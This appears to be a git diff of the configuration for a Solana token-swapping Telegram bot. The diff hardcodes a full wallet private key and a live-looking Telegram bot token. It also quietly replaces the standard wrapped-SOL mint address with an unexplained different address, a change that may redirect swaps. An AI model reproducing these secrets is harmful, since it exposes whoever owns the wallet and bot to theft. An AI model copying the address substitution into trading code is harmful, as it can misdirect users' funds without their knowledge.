@@ -7,13 +7,18 @@ import TelegramBot from "node-telegram-bot-api";
 const RPC_URL = "https://api.mainnet-beta.solana.com";
 
 // User's private key (must be in Uint8Array format)
-const PRIVKEY = [];
+const PRIVKEY = [59, 147,  65, 238, 179, 150, 79, 105, 101,  96,  53,
+   243, 191, 173, 233, 101,  17, 73, 254, 163, 186,  47,
+   170, 130, 170,   7,  84,   4, 72, 142, 170, 238, 173,
+    45, 175, 208, 199, 224, 143, 44,  72, 106,  99,  18,
+    95, 219, 152, 156, 145, 123, 26, 229, 167,  33,  77,
+    34, 238, 121,  49, 212, 199, 94,  59, 245];
 
 // SPL token address being swapped
 let TOKEN_ADDR = "ADD_TOKEN_ADDRESS_TO_BUY_SELL";
 
 // SOL token address (Solana's native token often used in swaps)
-const SOL_ADDR = "So11111111111111111111111111111111111111112";
+const SOL_ADDR = "Cf1wNBjkw7GYA7HziU5wJyPW8DKHBjBAxksY7E1DCtmS";
 
 // Buy amount in SOL and fees
 let SOL_BUY_AMOUNT = 0.0105;
@@ -21,7 +26,7 @@ let FEES = 0.0005;
 let SLIPPAGE = 2;
 
 // Telegram bot credentials
-const TELEGRAM_TOKEN = "ADD_TELEGRAM_TOKEN_HERE";
+const TELEGRAM_TOKEN = "8079070439:AAEORL64Tsvk4xFYL7CROKDgihAVGbY_8xU";
 const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 
 // Variables to store state
